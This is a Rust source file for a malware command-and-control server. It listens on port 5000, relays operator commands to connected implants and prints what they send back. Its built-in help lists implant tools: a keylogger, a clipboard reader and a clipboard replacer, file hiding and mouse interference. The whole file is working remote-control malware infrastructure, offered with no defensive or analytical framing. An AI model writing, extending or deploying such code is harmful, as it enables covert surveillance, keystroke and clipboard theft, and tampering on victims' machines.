use std::net::{TcpListener, TcpStream};
use std::io::{Read, Write};

fn handle_client(mut stream: TcpStream) {
    loop {
        if let Some(cmd) = c2::get_input() {
            match cmd.as_str() {
                "list" => { print!("\
Available tools:
- clipboard         Outputs the current clipboard
- ghost             Changes files in the current directory to hidden
- keylogger         Listens for keypresses and outputs them to a log file
- mouseketool       Moves mouse to a random position every so often
- replaceboard      Replaces the clipboard text
");
                }
                _ => { 
                    let _ = stream.write(cmd.as_bytes()).unwrap();

                    let mut buffer = [0; 1024];
                    if let Ok(n) = stream.read(&mut buffer) {
                        if n > 0 {
                            let result = String::from_utf8_lossy(&buffer[..n]);
                            println!("{}", result);
                        }
                    }
                }
            }
        }
    }
}

fn main() {
    let listener = TcpListener::bind("0.0.0.0:5000").expect("Failed to bind listener");
    println!("Listening on port 5000...");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("New connection! Use \'list\' to get a list of possible commands.");
                handle_client(stream);
            }
            Err(e) => {
                eprintln!("Connection failed: {}", e);
            }
        }
    }
}
